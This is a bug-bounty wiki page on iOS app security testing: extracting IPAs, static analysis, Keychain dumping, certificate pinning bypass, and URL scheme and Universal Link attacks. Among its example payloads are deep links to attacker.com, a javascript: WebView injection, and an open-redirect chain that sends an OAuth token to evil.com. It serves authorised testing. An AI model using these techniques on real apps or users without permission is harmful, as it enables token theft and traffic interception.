> Source: https://bugbounty.info/Attack-Surface/Mobile/iOS/index

# iOS Testing

iOS testing has a higher bar than Android because of the closed ecosystem. You need either a jailbroken device for dynamic analysis or a paid Apple Developer account for some tooling. Static analysis is still free and catches plenty. The IPA is just a zip file - unpack it and start reading.

## Getting the IPA

```bash
# Option 1: ipatool (free app from App Store with your Apple ID)
ipatool auth --email you@email.com --password yourpass
ipatool download -b com.target.app --output target.ipa
 
# Option 2: From a jailbroken device after installing the app
# frida-ios-dump (most reliable)
frida-ios-dump -u mobile -H 127.0.0.1 -p 2222 com.target.app -o target.ipa
 
# Option 3: Apple Configurator 2 (Mac only) - download app, intercept IPA before install
 
# Unpack the IPA - it's just a zip
unzip target.ipa -d ./ipa-unpacked/
# Binary is at: ipa-unpacked/Payload/Target.app/Target
```

## Static Analysis: IPA Unpacking

```bash
cd ./ipa-unpacked/Payload/Target.app/
 
# Key files to check immediately
cat Info.plist                    # URL schemes, permissions, ATS exceptions
ls -la                            # all bundled files
strings Target | grep -E "https://|api\.|secret|key|token|password|AWS"
```

**Info.plist analysis:**

```bash
# ATS (App Transport Security) exceptions = they're talking HTTP somewhere
# Look for:
# NSExceptionDomains -> tells you which domains have reduced security
# NSAllowsArbitraryLoads: true -> no TLS enforcement at all
# CFBundleURLTypes -> registered URL schemes (deep links)
# NSAppTransportSecurity -> ATS config
 
plutil -p Info.plist | grep -A5 "NSException\|CFBundleURL\|NSAllows"
```

## class-dump and Hopper

**class-dump for Objective-C binaries:**

```bash
class-dump -H Target -o ./headers/
# Dumps all class/method names to header files
# Look for: auth methods, cryptography, network calls, "admin", "debug", "internal"
 
grep -r "admin\|debug\|secret\|password\|token\|pin" ./headers/
```

**For Swift binaries:** class-dump doesn't work well. Use `nm` for symbols or Frida for runtime inspection.

```bash
nm -gU Target | grep -i "auth\|token\|secret\|network"
 
# Frida for Swift class enumeration
frida -U -f com.target.app --no-pause -e "
  ObjC.classes
" 2>/dev/null
```

**Hopper / Binary Ninja / Ghidra:**

```bash
# Open the binary in Hopper (paid) or Ghidra (free)
# Procedures list -> search for function names
# Key things to find:
# - SSL validation methods (SecTrustEvaluate, URLSession delegate methods)
# - Keychain usage (SecItemAdd, SecItemCopyMatching)
# - Crypto operations (CCCrypt, CommonCrypto)
# - Custom auth logic
```

## Keychain and Data Protection

The Keychain is supposed to be secure, but misconfiguration means data is accessible when it shouldn't be.

**Keychain access on a jailbroken device:**

```bash
# Keychain-Dumper
./keychain-dumper        # dumps all keychain items
./keychain-dumper -a     # all attributes including access control
 
# Or via objection
objection -g com.target.app explore
ios keychain dump
```

**What to look for:**

- `kSecAttrAccessibleAlways` or `kSecAttrAccessibleAlwaysThisDeviceOnly`: data accessible even when device is locked. Shouldn't be used for tokens.
- `kSecAttrAccessibleAfterFirstUnlock`: accessible after first unlock, even in background. Common and often fine, but tokens in here survive device reboots without re-auth.
- Missing `kSecAttrAccessControl` with biometric or passcode requirement on sensitive items.

**Files stored insecurely:**

```bash
# On jailbroken device or via objection
ios filesystem ls /var/mobile/Containers/Data/Application/<app-uuid>/
# Check: Documents/, Library/Preferences/*.plist, Library/Caches/
 
objection -g com.target.app explore
ios plist cat /Library/Preferences/com.target.app.plist
```

## URL Scheme Hijacking

Any app can register any URL scheme (unlike Universal Links, which require domain verification). If `target://` handles sensitive actions, a malicious app can intercept it.

**Finding URL schemes:**

```bash
grep -A10 "CFBundleURLTypes" Info.plist
# Look for custom schemes like: target://, targetpay://, targetauth://
```

**Testing scenarios:**

```bash
# On a device, craft a web page with this link and open in Safari
<a href="target://oauth/callback?code=stolen_code">click</a>
 
# If the app processes OAuth codes from URL schemes, any app can steal them
# The attack: register the same scheme in a malicious app, get the OAuth code
 
# Deep link parameter injection
# Does the app open a WebView from the deep link URL?
target://webview?url=https://attacker.com
target://webview?url=javascript:alert(1)
```

## Universal Links

Universal Links are more secure than URL schemes because they require a domain owner to publish an AASA file, but misconfigurations happen.

```bash
# Check the AASA file
curl https://target.com/.well-known/apple-app-site-association
curl https://target.com/apple-app-site-association
 
# What to look for:
# Overly broad path patterns: "paths": ["*"] means the entire site triggers the app
# If the app handles universal links to sensitive paths, test those paths
```

**Universal link + open redirect chain:**

```text
1. App handles universal links to https://target.com/auth/callback
2. https://target.com/auth/callback has an open redirect: ?next=https://evil.com
3. User clicks https://target.com/auth/callback?token=X&next=https://evil.com
4. App opens, processes token, redirects to evil.com with token in URL
```

## Certificate Pinning Bypass on iOS

```bash
# objection is the fastest path
objection -g com.target.app explore
ios sslpinning disable
 
# SSL Kill Switch 2 (Cydia tweak on jailbroken device) - system-wide
 
# Frida script for custom pinning
frida -U -f com.target.app -l ssl-kill-switch.js
 
# If the app uses TrustKit, hook TrustKit's validation
# If native (NSURLSession delegate), hook URLSession:didReceiveChallenge:
```

## Public Reports

- iOS URL scheme hijacking allows OAuth code theft via custom deep link - [HackerOne #665534](https://hackerone.com/reports/665534)
- Keychain items stored with kSecAttrAccessibleAlways accessible when device locked - [HackerOne #838794](https://hackerone.com/reports/838794)
- ATS exception in Info.plist allows plaintext HTTP to internal API endpoint - [HackerOne #1244053](https://hackerone.com/reports/1244053)
- Universal link + open redirect chain exfiltrates OAuth token to attacker domain - [HackerOne #956799](https://hackerone.com/reports/956799)
- Hardcoded API key in iOS binary gives full write access to production S3 bucket - [HackerOne #1060410](https://hackerone.com/reports/1060410)

## See Also

- [Shared Mobile Patterns](../../../Attack-Surface/Mobile/Shared/) - what to do with traffic once pinning is bypassed
- [REST API Testing](../../../Attack-Surface/API/REST) - the backend bugs the app is talking to
